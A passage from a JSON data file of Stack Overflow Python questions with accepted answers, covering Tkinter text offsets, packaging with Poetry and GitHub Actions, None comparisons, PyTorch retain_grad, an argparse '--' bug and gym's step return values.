    "AcceptedAnswer": "In Python, if you have expression1() + expression2(), expression1() is evaluated first.\nSo 1 and 2 are really equivalent to:\nleft = holder.val\nright = self.diveDeeper(holder, n - 1)\nholder.val = left + right\n\nNow, holder.val is only ever modified after the recursive call, but you use the value from before the recursive call, which means that no matter the iteration, left == 0.\nYour solution 3 is equivalent to:\nright = self.diveDeeper(holder, n - 1)\nleft = holder.val\nholder.val = left + right\n\nSo the recursive call is made before left = holder.val is evaluated, which means left is now the result of the sum of the previous iteration.\nThis is why you have to be careful with mutable state, you got to understand the order of operations perfectly.\n"
}
{
    "Id": 74447766,
    "PostTypeId": 1,
    "Title": "Tkinter - Use characters/bytes offset as index for text widget",
    "Body": "I want to delete part of a text widget's content, using only character offset (or bytes if possible).\nI know how to do it for lines, words, etc. Looked around a lot of documentations:\n\nhttps://www.tcl.tk/man/tcl8.6/TkCmd/text.html#M24\nhttps://tkdocs.com/tutorial/text.html\nhttps://anzeljg.github.io/rin2/book2/2405/docs/tkinter/text-methods.html\nhttps://web.archive.org/web/20120112185338/http://effbot.org/tkinterbook/text.htm\n\nHere is an example mre:\nimport tkinter as tk\n\nroot = tk.Tk()\n\ntext = tk.Text(root)\n\ntxt = \"\"\"Lorem ipsum dolor sit amet, consectetur adipiscing elit.\nSuspendisse enim lorem, aliquam quis quam sit amet, pharetra porta lectus.\nNam commodo imperdiet sapien, in maximus nibh vestibulum nec.\nQuisque rutrum massa eget viverra viverra. Vivamus hendrerit ultricies nibh, ac tincidunt nibh eleifend a. Nulla in dolor consequat, fermentum quam quis, euismod dui.\nNam at gravida nisi. Cras ut varius odio, viverra molestie arcu.\n\nPellentesque scelerisque eros sit amet sollicitudin venenatis.\nProin fermentum vestibulum risus, quis suscipit velit rutrum id.\nPhasellus nisl justo, bibendum non dictum vel, fermentum quis ipsum.\nNunc rutrum nulla quam, ac pretium felis dictum in. Sed ut vestibulum risus, suscipit tempus enim.\nNunc a imperdiet augue.\nNullam iaculis consectetur sodales.\nPraesent neque turpis, accumsan ultricies diam in, fermentum semper nibh.\nNullam eget aliquet urna, at interdum odio. Nulla in mi elementum, finibus risus aliquam, sodales ante.\nAenean ut tristique urna, sit amet condimentum quam. Mauris ac mollis nisi.\nProin rhoncus, ex venenatis varius sollicitudin, urna nibh fringilla sapien, eu porttitor felis urna eu mi.\nAliquam aliquam metus non lobortis consequat.\nPellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Aenean id orci dui.\"\"\"\n\ntext.insert(tk.INSERT, txt)\n\n\ndef test_delete(event=None):\n    text.delete() # change this line here\n\ntext.pack(fill=\"both\", expand=1)\ntext.pack_propagate(0)\ntext.bind('', test_delete)\nroot.mainloop()\n\nIt display an example text inside a variable, inside a text widget. I use a single key binding to test some of the possible ways to do what I want on that piece of text.\nI tried a lot of things, both from the documentation(s) and my own desperation:\n\ntext.delete(0.X): where X is any number. I thought since lines were 1.0, maybe using 0.X would work on chars only. It only work with a single char, regardless of what X is (even with a big number).\ntext.delete(1.1, 1.3): This act on the same line, because I was trying to see if it would delete 3 chars in any direction on the same line. It delete 2 chars instead of 3, and it does so by omitting one char at the start of the first line, and delete 2 char after that.\ntext.delete(\"end - 9c\"): only work at the end (last line), and omit 7 chars starting from EOF, and then delete a single char after that.\ntext.delete(0.1, 0.2): Does not do anything. Same result for other 0.X, 0.X combination.\n\nExample of what I try to achieve:\nUsing the example text above would take too long, so let's consider a smaller string, say \"hello world\".\nNow let's say we use an index that start with 1 (doesn't matter but make things easier to explain), the first char is \"h\" and the last one is \"d\". So say I use chars range such as \"2-7\", that would be \"ello w\". Say I want to do \"1-8\"? -> \"hello wo\", and now starting from the end, \"11-2\", \"ello world\".\nThis is basically similar to what f.tell() and f.seek() do. I want to do something like that but using only the content inside of the text widget, and then do something on those bytes/chars ranges (in the example above, I'm deleting them, etc).\n",
    "AcceptedAnswerId": 74461805,
    "AcceptedAnswer": "Based on my own relentless testing and other answers here, I managed to get to a solution.\nimport tkinter as tk\nfrom tkinter import messagebox  # https://stackoverflow.com/a/29780454/12349101\n\nroot = tk.Tk()\n\nmain_text = tk.Text(root)\n\nbox_text = tk.Text(root, height=1, width=10)\nbox_text.pack()\n\ntxt = \"\"\"hello world\"\"\"\n\nlen_txt = len(\n    txt)  # get the total length of the text content. Can be replaced by `os.path.getsize` or other alternatives for files\n\nmain_text.insert(tk.INSERT, txt)\n\n\ndef offset():\n    inputValue = box_text.get(\"1.0\",\n                              \"end-1c\")  # get the input of the text widget without newline (since it's added by default)\n\n    # focusing the other text widget, deleting and re-insert the original text so that the selection/tag is updated (no need to move the mouse to the other widget in this example)\n    main_text.focus()\n    main_text.delete(\"1.0\", tk.END)\n    main_text.insert(tk.INSERT, txt)\n\n\n    to_do = inputValue.split(\"-\")\n\n    if len(to_do) == 1:  # if length is 1, it probably is a single offset for a single byte/char\n        to_do.append(to_do[0])\n\n    if not to_do[0].isdigit() or not to_do[1].isdigit():  # Only integers are supported\n        messagebox.showerror(\"error\", \"Only integers are supported\")\n        return  # trick to prevent the failing range to be executed\n\n    if int(to_do[0]) > len_txt or int(to_do[1]) > len_txt:  # total length is the maximum range\n        messagebox.showerror(\"error\",\n                             \"One of the integers in the range seems to be bigger than the total length\")\n        return  # trick to prevent the failing range to be executed\n\n    if to_do[0] == \"0\" or to_do[1] == \"0\":  # since we don't use a 0 index, this isn't needed\n        messagebox.showerror(\"error\", \"Using zero in this range isn't useful\")\n        return  # trick to prevent the failing range to be executed\n\n    if int(to_do[0]) > int(to_do[1]):  # This is to support reverse range offset, so 11-2 -> 2-11, etc\n        first = int(to_do[1]) - 1\n        first = str(first).split(\"-\")[-1:][0]\n\n        second = (int(to_do[0]) - len_txt) - 1\n        second = str(second).split(\"-\")[-1:][0]\n    else:  # use the offset range normally\n        first = int(to_do[0]) - 1\n        first = str(first).split(\"-\")[-1:][0]\n\n        second = (int(to_do[1]) - len_txt) - 1\n        second = str(second).split(\"-\")[-1:][0]\n\n    print(first, second)\n    main_text.tag_add(\"sel\", '1.0 + {}c'.format(first), 'end - {}c'.format(second))\n\n\nbuttonCommit = tk.Button(root, text=\"use offset\",\n                         command=offset)\nbuttonCommit.pack()\nmain_text.pack(fill=\"both\", expand=1)\nmain_text.pack_propagate(0)\nroot.mainloop()\n\nNow the above works, as described in the \"hello world\" example in my post. It isn't a 1:1 clone/emulation of f.tell() or f.seek(), but I feel like it's close.\nThe above does not use text.delete but instead select the text, so it's visually less confusing (at least to me).\nIt works with the following offset type:\n\nreverse range: 11-2 -> 2-11 so the order does not matter\nnormal range: 2-11, 1-8, 8-10...\nsingle offset: 10 or 10-10 so it can support single char/byte\n\nNow the main thing I noticed, is that '1.0 + {}c', 'end - {}c' where {} is the range, works by omitting its given range.\nIf you were to use 1-3 as a range on the string hello world it would select ello wor. You could say it omitted h and ld\\n, with the added newline by Tkinter (which we ignore in the code above unless it's part of the total length variable). The correct offset (or at least the one following the example I gave in the post above) would be 2-9.\nP.S: For this example, clicking on the button after entering the offsets range is needed.\n"
}
{
    "Id": 73257839,
    "PostTypeId": 1,
    "Title": "'setup.py install is deprecated' warning shows up every time I open a terminal in VSCode",
    "Body": "Every time I boot up terminal on VSCode, I get the following prompt. This does not happen on Terminal.app.\n    /usr/local/lib/python3.9/site-packages/setuptools/command/install.py:34:\nSetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip\nand other standards-based tools.\n\nHow do I resolve this?\n",
    "AcceptedAnswerId": 73273307,
    "AcceptedAnswer": "Install the setuptools 58.2.0 version using the following command\npip install setuptools==58.2.0\n\n"
}
{
    "Id": 73157383,
    "PostTypeId": 1,
    "Title": "How do you create a fully-fledged Python package?",
    "Body": "When creating a Python package, you can simply write the code, build the package, and share it on PyPI. But how do you do that?\n\nHow do you create a Python package?\nHow do you publish it?\n\nAnd then, what if you want to go further?\n\nHow do you set up CI/CD for it?\nHow do you test it and check code coverage?\nHow do you lint it?\nHow do you automate everything you can?\n\n",
    "AcceptedAnswerId": 73157490,
    "AcceptedAnswer": "Preamble\nWhen you've published dozens of packages, you know how to answer these questions in ways that suit your workflow(s) and taste. But answering these questions for the first time can be quite difficult, time consuming, and frustrating!\nThat's why I spent days researching ways of doing these things, which I then published as a blog article called How to create a Python package in 2022.\nThat article, and this answer, document my findings for when I wanted to publish my package extendedjson\nOverview\nHere is an overview of some tools you can use and the steps you can take, in the order I followed them while discovering all of this.\nDisclaimer: other alternative tools exist (usually) & most of the steps here are not mandatory.\n\nUse Poetry for dependency management\nUse GitHub to host the code\nUse pre-commit to ensure committed code is linted & formatted well\nUse Test PyPI to test uploading your package (which will make it installable with pip)\nUse Scriv for changelog management\nUpload to the real PyPI\nUse pytest to test your Python code\nUse tox to automate linting, formatting, and testing across Python versions\n\nblack\nisort\npylint\nflake8 with mccabe\n\n\nAdd code coverage with coverage.py\nSet up CI/CD with GitHub Actions\n\nrun linters and tests\ntrigger automatically on pull requests and commits\nintegrate with Codecov for coverage reports\npublish to PyPI automatically\n\n\nAdd cool README badges\nTidy up a bit\n\nset tox to use pre-commit\nremove duplicate work between tox and pre-commit hooks\nremove some redundancy in CI/CD\n\n\n\nSteps\nHere is an overview of the things you can do and more or less how to do it. Again, thorough instructions plus the rationale of why I picked certain tools, methods, etc, can be found in the reference article.\n\nUse Poetry for dependency management.\n\npoetry init initialises a project in a directory or poetry new dirname creates a new directory structure for you\ndo poetry install to install all your dependencies\npoetry add packagename can be used to add packagename as a dependency, use -D if it's a development dependency (i.e., you need it while developing the package, but the package users won't need it. For example, black is a nice example of a development dependency)\n\n\nSet up a repository on GitHub to host your code.\n\nSet up pre-commit hooks to ensure your code is always properly formatted and it passes linting. This goes on .pre-commit-config.yaml. E.g., the YAML below checks TOML and YAML files, ensures all files end with a newline, makes sure the end-of-line marker is consistent across all files, and then runs black and isort on your code.\n\n\n# See https://pre-commit.com for more information\n# See https://pre-commit.com/hooks.html for more hooks\nrepos:\n\u00a0 - repo: https://github.com/pre-commit/pre-commit-hooks\n\u00a0 \u00a0 rev: v4.0.1\n\u00a0 \u00a0 hooks:\n\u00a0 \u00a0 \u00a0 - id: check-toml\n\u00a0 \u00a0 \u00a0 - id: check-yaml\n\u00a0 \u00a0 \u00a0 - id: end-of-file-fixer\n\u00a0 \u00a0 \u00a0 - id: mixed-line-ending\n\u00a0 - repo: https://github.com/psf/black\n\u00a0 \u00a0 rev: 22.3.0\n\u00a0 \u00a0 hooks:\n\u00a0 \u00a0 \u00a0 - id: black\n\u00a0 - repo: https://github.com/PyCQA/isort\n\u00a0 \u00a0 rev: 5.10.1\n\u00a0 \u00a0 hooks:\n\u00a0 \u00a0 \u00a0 - id: isort\n\u00a0 \u00a0 \u00a0 \u00a0 args: [\"--profile\", \"black\"]\n\n\nConfigure Poetry to use the Test PyPI to make sure you can publish a package and it is downloadable & installable.\n\nTell Poetry about Test PyPI with poetry config repositories.testpypi https://test.pypi.org/legacy/\nLog in to Test PyPI, get an API token, and tell Poetry to use it with poetry config http-basic.testpypi __token__ pypi-your-api-token-here (the __token__ is a literal and shouldn't be replaced, your token goes after that).\nBuild poetry build and upload your package poetry publish -r testpypi\n\n\nManage your CHANGELOG with Scriv\n\nrun scriv create before any substantial commit and edit the file that pops up\nrun scriv collect before any release to collect all fragments into one changelog\n\n\nConfigure Poetry to use PyPI\n\nlogin to PyPI and get an API token\ntell Poetry about it with poetry config pypi-token.pypi pypi-your-token-here\nbuild & publish your package in one fell swoop with poetry publish --build\n\n\nDo a victory lap: try pip install yourpackagename to make sure everything is going great ;)\n\nPublish a GH release that matches what you uploaded to PyPI\n\nWrite tests. There are many options out there. Pytest is simple, versatile, and not too verbose.\n\nwrite tests in a directory tests/\nstart test files with test_...\nactual tests are functions with a name starting with test_...\nuse assertions (assert) to check for things (tests fail when asserting something Falsy); notice sometimes you don't even need to import pytest in your test files; e.g.:\n\n\n\n# In tests/test_basic_example.py\n\ndef this_test_would_definitely_fail():\n\u00a0 \u00a0 assert 5 > 10\n\ndef this_test_would_definitely_pass():\n\u00a0 \u00a0 assert 5 > 0\n\n\nrun tests with the command pytest\n\nAutomate testing, linting, and formatting, with tox.\n\ntox creates virtual environments for separate Python versions and can run essentially what you tell it to. Configuration goes in tox.ini. You can also embed it in the file pyproject.toml, but as of writing this, that's only supported if you add a string that actually represents the .ini configuration, which is ugly. Example tox.ini:\n\n\n\n[tox]\nisolated_build = True\nenvlist = py38,py39,py310\n\n[testenv]\ndeps =\n\u00a0 \u00a0 black\n\u00a0 \u00a0 pytest\ncommands =\n\u00a0 \u00a0 black --check extendedjson\n\u00a0 \u00a0 pytest .\n\nThe environments py38 to py310 are automatically understood by tox to represent different Python versions (you guess which ones). The header [testenv] defines configurations for all those environments that tox knows about. We install the dependencies listed in deps = ... and then run the commands listed in commands = ....\n\nrun tox with tox for all environments or tox -e py39 to pick a specific environment\n\nAdd code coverage with coverage.py\n\nrun tests and check coverage with coverage run --source=yourpackage --branch -m pytest .\ncreate a nice HTML report with coverage html\nadd this to tox\n\n\nCreate a GitHub action that runs linting and testing on commits and pull requests\n\nGH Actions are just YAML files in .github/workflows\nthis example GH action runs tox on multiple Python versions\n\n\n\n# .github/workflows/build.yaml\nname: Your amazing CI name\n\n# Run automatically on...\non:\n\u00a0 push: \u00a0# pushes...\n\u00a0 \u00a0 branches: [ main ] \u00a0# to the main branch... and\n\u00a0 pull_request: \u00a0# on pull requests...\n\u00a0 \u00a0 branches: [ main ] \u00a0# against the main branch.\n\n# What jobs does this workflow run?\njobs:\n\u00a0 build: \u00a0# There's a job called \u201cbuild\u201d which\n\u00a0 \u00a0 runs-on: ubuntu-latest \u00a0# runs on an Ubuntu machine\n\u00a0 \u00a0 strategy:\n\u00a0 \u00a0 \u00a0 matrix: \u00a0# that goes through\n\u00a0 \u00a0 \u00a0 \u00a0 python-version: [\"3.8\", \"3.9\", \"3.10\"] \u00a0# these Python versions.\n\n\u00a0 \u00a0 steps: \u00a0# The job \u201cbuild\u201d has multiple steps:\n\u00a0 \u00a0 \u00a0 - name: Checkout sources\n\u00a0 \u00a0 \u00a0 \u00a0 uses: actions/checkout@v2 \u00a0# Checkout the repository into the runner,\n\n\u00a0 \u00a0 \u00a0 - name: Setup Python\n\u00a0 \u00a0 \u00a0 \u00a0 uses: actions/setup-python@v2 \u00a0# then set up Python,\n\u00a0 \u00a0 \u00a0 \u00a0 with:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 python-version: ${{ matrix.python-version }} \u00a0# with the version that is currently \u201cselected\u201d...\n\n\u00a0 \u00a0 \u00a0 - name: Install dependencies\n\u00a0 \u00a0 \u00a0 \u00a0 run: | \u00a0# Then run these commands\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 python -m pip install --upgrade pip\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 python -m pip install tox tox-gh-actions \u00a0# install two dependencies...\n\n\u00a0 \u00a0 \u00a0 - name: Run tox\n\u00a0 \u00a0 \u00a0 \u00a0 run: tox \u00a0# and finally run tox.\n\nNotice that, above, we installed tox and a plugin called tox-gh-actions.\nThis plugin will make tox aware of the Python version that is set up in the GH action runner, which will allow us to specify which environments tox will run in that case.\nWe just need to set a correspondence in the file tox.ini:\n# tox.ini\n# ...\n[gh-actions]\npython =\n\u00a0 \u00a0 3.8: py38\n\u00a0 \u00a0 3.9: py39\n\u00a0 \u00a0 3.10: py310\n\n\nIntegrate with Codecov for nice coverage reports in the pull requests.\n\nlog in to Codecov with GitHub and give permissions\nadd Codecov's action to the YAML from before after tox runs (it's tox that generates the local coverage report data) and add/change a coverage command to generate an xml report (it's a format that Codecov understands)\n\n\n\n# ...\n\u00a0 \u00a0 \u00a0 - name: Upload coverage to Codecov\n\u00a0 \u00a0 \u00a0 \u00a0 uses: codecov/codecov-action@v2\n\u00a0 \u00a0 \u00a0 \u00a0 with:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 fail_ci_if_error: true\n\n\nAdd a GH Action to publish to PyPI automatically\n\njust set up a YAML file that does your manual steps of building and publishing with Poetry when a new release is made\ncreate a PyPI token to be used by GitHub\nadd it as a secret in your repository\nconfigure Poetry in the action to use that secret\n\n\n\nname: Publish to PyPI\n\non:\n\u00a0 release:\n\u00a0 \u00a0 types: [ published ]\n\u00a0 \u00a0 branches: [ main ]\n\u00a0 workflow_dispatch:\n\njobs:\n\u00a0 build-and-publish:\n\u00a0 \u00a0 runs-on: ubuntu-latest\n\n\u00a0 \u00a0 steps:\n\u00a0 \u00a0 \u00a0 # Checkout and set up Python\n\n\u00a0 \u00a0 \u00a0 - name: Install poetry and dependencies\n\u00a0 \u00a0 \u00a0 \u00a0 run: |\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 python -m pip install --upgrade pip\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 python -m pip install poetry\n\n\u00a0 \u00a0 \u00a0 - name: Configure poetry\n\u00a0 \u00a0 \u00a0 \u00a0 env:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 pypi_token: ${{ secrets.PyPI_TOKEN }} \u00a0# You set this manually as a secret in your repository\n\u00a0 \u00a0 \u00a0 \u00a0 run: poetry config pypi-token.pypi $pypi_token\n\n\u00a0 \u00a0 \u00a0 - name: Build and publish\n\u00a0 \u00a0 \u00a0 \u00a0 run: poetry publish --build\n\n\nAdd cool badges to your README file like\n\n\n\n\n\n\nTidy up a bit\n\nrun linting through tox on pre-commit to deduplicate effort and run your preferred versions of the linters/formatters/...\nseparate linting/formatting from testing in tox as a separate environment\ncheck coverage only once as a separate tox environment\n\n\n\n"
}
{
    "Id": 74743233,
    "PostTypeId": 1,
    "Title": "What happens \"behind the scenes\" if I call `None == x` in Python?",
    "Body": "I am learning and playing around with Python and I came up with the following test code (please be aware that I would not write productive code like that, but when learning new languages I like to play around with the language's corner cases):\na = None    \nprint(None == a) # I expected True, I got True\n\nb = 1\nprint(None == b) # I expected False, I got False\n\nclass MyNone:\n    # Called if I compare some myMyNone == somethingElse\n    def __eq__(self, __o: object) -> bool:\n        return True\n\nc = MyNone()\nprint (None == c) # !!! I expected False, I got True !!!\n\nPlease see the very last line of the code example.\nHow can it be that None == something, where something is clearly not None, return True? I would have expected that result for something == None, but not for None == something.\nI expected that it would call None is something behind the scenes.\nSo I think the question boils down to: How does the __eq__ method of the None singleton object look like and how could I have found that out?\n\nPS: I am aware of PEP-0008 and its quote\n\nComparisons to singletons like None should always be done with is or is not, never the equality operators.\n\nbut I still would like to know why print (None == c) in the above example returns True.\n",
    "AcceptedAnswerId": 74743523,
    "AcceptedAnswer": "In fact, None's type does not have its own __eq__ method; within Python we can see that it apparently inherits from the base class object:\n>>> type(None).__eq__\n\n\nBut this is not really what's going on in the source code. The implementation of None can be found in Objects/object.c in the CPython source, where we see:\nPyTypeObject _PyNone_Type = {\n    PyVarObject_HEAD_INIT(&PyType_Type, 0)\n    \"NoneType\",\n    0,\n    0,\n    none_dealloc,       /*tp_dealloc*/ /*never called*/\n    0,                  /*tp_vectorcall_offset*/\n    0,                  /*tp_getattr*/\n    0,                  /*tp_setattr*/\n    // ...\n    0,                  /*tp_richcompare */\n    // ...\n    0,                  /*tp_init */\n    0,                  /*tp_alloc */\n    none_new,           /*tp_new */\n};\n\nI omitted most of the irrelevant parts. The important thing here is that _PyNone_Type's tp_richcompare is 0, i.e. a null pointer. This is checked for in the do_richcompare function:\n    if ((f = Py_TYPE(v)->tp_richcompare) != NULL) {\n        res = (*f)(v, w, op);\n        if (res != Py_NotImplemented)\n            return res;\n        Py_DECREF(res);\n    }\n    if (!checked_reverse_op && (f = Py_TYPE(w)->tp_richcompare) != NULL) {\n        res = (*f)(w, v, _Py_SwappedOp[op]);\n        if (res != Py_NotImplemented)\n            return res;\n        Py_DECREF(res);\n    }\n\nTranslating for those who don't speak C:\n\nIf the left-hand-side's tp_richcompare function is not null, call it, and if its result is not NotImplemented then return that result.\nOtherwise if the reverse hasn't already been checked*, and the right-hand-side's tp_richcompare function is not null, call it, and if the result is not NotImplemented then return that result.\n\nThere are some other branches in the code, to fall back to in case none of those branches returns a result. But these two branches are enough to see what's going on. It's not that type(None).__eq__ returns NotImplemented, rather the type doesn't have the corresponding function in the C source code at all. That means the second branch is taken, hence the result you observe.\n*The flag checked_reverse_op is set if the reverse direction has already been checked; this happens if the right-hand-side is a strict subtype of the left-hand-side, in which case it takes priority. That doesn't apply in this case since there is no subtype relation between type(None) and your class.\n"
}
{
    "Id": 73698041,
    "PostTypeId": 1,
    "Title": "How retain_grad() in pytorch works? I found its position changes the grad result",
    "Body": "in a simple test in pytorch, I want to see grad in a non-leaf tensor, so I use retain_grad():\nimport torch\na = torch.tensor([1.], requires_grad=True)\ny = torch.zeros((10))\ngt = torch.zeros((10))\n\ny[0] = a\ny[1] = y[0] * 2\ny.retain_grad()\n\nloss = torch.sum((y-gt) ** 2)\nloss.backward()\nprint(y.grad)\n\nit gives me a normal output:\ntensor([2., 4., 0., 0., 0., 0., 0., 0., 0., 0.])\n\nbut when I use retain grad() before y[1] and after y[0] is assigned:\nimport torch\na = torch.tensor([1.], requires_grad=True)\ny = torch.zeros((10))\ngt = torch.zeros((10))\n\ny[0] = a\ny.retain_grad()\ny[1] = y[0] * 2\n\nloss = torch.sum((y-gt) ** 2)\nloss.backward()\nprint(y.grad)\n\nnow the output changes to:\ntensor([10.,  0.,  0.,  0.,  0.,  0.,  0.,  0.,  0.,  0.])\n\nI can't understand the result at all.\n",
    "AcceptedAnswerId": 73701220,
    "AcceptedAnswer": "Okay so what's going on is really weird.\nWhat .retain_grad() essentially does is convert any non-leaf tensor into a leaf tensor, such that it contains a .grad attribute (since by default, pytorch computes gradients to leaf tensors only).\nHence, in your first example, after calling y.retain_grad(), it basically converted y into a leaf tensor with an accessible .grad attribute.\nHowever, in your second example, you initially converted the entire y tensor into a leaf tensor; then, you created a non-leaf tensor (y[1]) within your leaf tensor (y), which is what caused the confusion.\ny = torch.zeros((10))  # y is a non-leaf tensor\n\ny[0] = a  # y[0] is a non-leaf tensor\ny.retain_grad()  # y is a leaf tensor (including y[1])\ny[1] = y[0] * 2  # y[1] is a non-leaf tensor, BUT y[0], y[2], y[3], ..., y[9] are all leaf tensors!\n\nThe confusing part is:\ny[1] after calling y.retain_grad() is now a leaf tensor with a .grad attribute. However, y[1] after the computation (y[1] = y[0] * 2) is now not a leaf tensor with a .grad attribute; it is now treated as a new non-leaf variable/tensor.\nTherefore, when calling loss.backward(), the Chain rule of the loss w.r.t y, and particularly looking at the Chain rule of the loss w.r.t leaf y[1] now looks something like this:\n\n\n"
}
{
    "Id": 73326570,
    "PostTypeId": 1,
    "Title": "Why is the float * int multiplication faster than int * float in CPython?",
    "Body": "Basically, the expression 0.4 * a is consistently, and surprisingly, significantly faster than a * 0.4. a being an integer. And I have no idea why.\nI speculated that it is a case of a LOAD_CONST LOAD_FAST bytecode pair being \"more specialized\" than the LOAD_FAST LOAD_CONST and I would be entirely satisfied with this explanation, except that this quirk seems to apply only to multiplications where types of multiplied variables differ. (By the way, I can no longer find the link to this \"bytecode instruction pair popularity ranking\" I once found on github, does anyone have a link?)\nAnyway, here are the micro benchmarks:\n$ python3.10 -m pyperf timeit -s\"a = 9\" \"a * 0.4\"\nMean +- std dev: 34.2 ns +- 0.2 ns\n\n$ python3.10 -m pyperf timeit -s\"a = 9\" \"0.4 * a\"\nMean +- std dev: 30.8 ns +- 0.1 ns\n\n$ python3.10 -m pyperf timeit -s\"a = 0.4\" \"a * 9\"\nMean +- std dev: 30.3 ns +- 0.3 ns\n\n$ python3.10 -m pyperf timeit -s\"a = 0.4\" \"9 * a\"\nMean +- std dev: 33.6 ns +- 0.3 ns\n\nAs you can see - in the runs where the float comes first (2nd and 3rd) - it is faster.\nSo my question is where does this behavior come from? I'm 90% sure that it is an implementation detail of CPython, but I'm not that familiar with low level instructions to state that for sure.\n",
    "AcceptedAnswerId": 73326827,
    "AcceptedAnswer": "It's CPython's implementation of the BINARY_MULTIPLY opcode. It has no idea what the types are at compile-time, so everything has to be figured out at run-time. Regardless of what a and b may be, BINARY_MULTIPLY ends up inoking a.__mul__(b).\nWhen a is of int type int.__mul__(a, b) has no idea what to do unless b is also of int type. It returns Py_RETURN_NOTIMPLEMENTED (an internal C constant). This is in longobject.c's CHECK_BINOP macro. The interpreter sess that, and effectively says \"OK, a.__mul__ has no idea what to do, so let's give b.__rmul__ a shot at it\". None of that is free - it all takes time.\nfloat.__mul__(b, a) (same as float.__rmul__) does know what to do with an int (converts it to float first), so that succeeds.\nBut when a is of float type to begin with, we go to float.__mul__ first, and that's the end of it. No time burned figuring out that the int type doesn't know what to do.\nThe actual code is quite a bit more involved than the above pretends, but that's the gist of it.\n"
}
{
    "Id": 73353608,
    "PostTypeId": 1,
    "Title": "Why does argparse not accept \"--\" as argument?",
    "Body": "My script takes -d, --delimiter as argument:\nparser.add_argument('-d', '--delimiter')\n\nbut when I pass it -- as delimiter, it is empty\nscript.py --delimiter='--' \n\nI know -- is special in argument/parameter parsing, but I am using it in the form --option='--' and quoted.\nWhy does it not work?\nI am using Python 3.7.3\nHere is test code:\n#!/bin/python3\n\nimport argparse\n\nparser = argparse.ArgumentParser()\nparser.add_argument('--delimiter')\nparser.add_argument('pattern')\n\nargs = parser.parse_args()\n\nprint(args.delimiter)\n\nWhen I run it as script --delimiter=-- AAA it prints empty args.delimiter.\n",
    "AcceptedAnswerId": 73354266,
    "AcceptedAnswer": "This looks like a bug. You should report it.\nThis code in argparse.py is the start of _get_values, one of the primary helper functions for parsing values:\nif action.nargs not in [PARSER, REMAINDER]:\n    try:\n        arg_strings.remove('--')\n    except ValueError:\n        pass\n\nThe code receives the -- argument as the single element of a list ['--']. It tries to remove '--' from the list, because when using -- as an end-of-options marker, the '--' string will end up in arg_strings for one of the _get_values calls. However, when '--' is the actual argument value, the code still removes it anyway, so arg_strings ends up being an empty list instead of a single-element list.\nThe code then goes through an else-if chain for handling different kinds of argument (branch bodies omitted to save space here):\n# optional argument produces a default when not present\nif not arg_strings and action.nargs == OPTIONAL:\n    ...\n# when nargs='*' on a positional, if there were no command-line\n# args, use the default if it is anything other than None\nelif (not arg_strings and action.nargs == ZERO_OR_MORE and\n      not action.option_strings):\n    ...\n# single argument or optional argument produces a single value\nelif len(arg_strings) == 1 and action.nargs in [None, OPTIONAL]:\n    ...\n# REMAINDER arguments convert all values, checking none\nelif action.nargs == REMAINDER:\n    ...\n# PARSER arguments convert all values, but check only the first\nelif action.nargs == PARSER:\n    ...\n# SUPPRESS argument does not put anything in the namespace\nelif action.nargs == SUPPRESS:\n    ...\n# all other types of nargs produce a list\nelse:\n    ...\n\nThis code should go through the 3rd branch,\n# single argument or optional argument produces a single value\nelif len(arg_strings) == 1 and action.nargs in [None, OPTIONAL]:\n\nbut because the argument is missing from arg_strings, len(arg_strings) is 0. It instead hits the final case, which is supposed to handle a completely different kind of argument. That branch ends up returning an empty list instead of the '--' string that should have been returned, which is why args.delimiter ends up being an empty list instead of a '--' string.\n\nThis bug manifests with positional arguments too. For example,\nimport argparse\n\nparser = argparse.ArgumentParser()\nparser.add_argument('a')\nparser.add_argument('b')\n\nargs = parser.parse_args([\"--\", \"--\", \"--\"])\n\nprint(args)\n\nprints\nNamespace(a='--', b=[])\n\nbecause when _get_values handles the b argument, it receives ['--'] as arg_strings and removes the '--'. When handling the a argument, it receives ['--', '--'], representing one end-of-options marker and one actual -- argument value, and it successfully removes the end-of-options marker, but when handling b, it removes the actual argument value.\n"
}
{
    "Id": 73195438,
    "PostTypeId": 1,
    "Title": "OpenAI GYM's env.step(): what are the values?",
    "Body": "I am getting to know OpenAI's GYM (0.25.1) using Python3.10 with gym's environment set to 'FrozenLake-v1 (code below).\nAccording to the documentation, calling env.step() should return a tuple containing 4 values (observation, reward, done, info). However, when running my code accordingly, I get a ValueError:\nProblematic code:\nobservation, reward, done, info = env.step(new_action)\n\nError:\n      3 new_action = env.action_space.sample()\n----> 5 observation, reward, done, info = env.step(new_action)\n      7 # here's a look at what we get back\n      8 print(f\"observation: {observation}, reward: {reward}, done: {done}, info: {info}\")\n\nValueError: too many values to unpack (expected 4)\n\nAdding one more variable fixes the error:\na, b, c, d, e = env.step(new_action)\nprint(a, b, c, d, e)\n\nOutput:\n5 0 True True {'prob': 1.0}\n\nMy interpretation:\n\n5 should be observation\n0 is reward\nprob: 1.0 is info\nOne of the True's is done\n\nSo what's the leftover boolean standing for?\nThank you for your help!\n\nComplete code:\nimport gym\n\nenv = gym.make('FrozenLake-v1', new_step_api=True, render_mode='ansi') # build environment\n\ncurrent_obs = env.reset() # start new episode\n\nfor e in env.render():\n    print(e)\n    \nnew_action = env.action_space.sample() # random action\n\nobservation, reward, done, info = env.step(new_action) # perform action, ValueError!\n\nfor e in env.render():\n    print(e)\n\n",
    "AcceptedAnswerId": 73195616,
    "AcceptedAnswer": "From the code's docstrings:\n\n       Returns:\n           observation (object): this will be an element of the environment's :attr:`observation_space`.\n               This may, for instance, be a numpy array containing the positions and velocities of certain objects.\n           reward (float): The amount of reward returned as a result of taking the action.\n           terminated (bool): whether a `terminal state` (as defined under the MDP of the task) is reached.\n               In this case further step() calls could return undefined results.\n           truncated (bool): whether a truncation condition outside the scope of the MDP is satisfied.\n               Typically a timelimit, but could also be used to indicate agent physically going out of bounds.\n               Can be used to end the episode prematurely before a `terminal state` is reached.\n           info (dictionary): `info` contains auxiliary diagnostic information (helpful for debugging, learning, and logging).\n               This might, for instance, contain: metrics that describe the agent's performance state, variables that are\n               hidden from observations, or individual reward terms that are combined to produce the total reward.\n               It also can contain information that distinguishes truncation and termination, however this is deprecated in favour\n               of returning two booleans, and will be removed in a future version.\n           (deprecated)\n           done 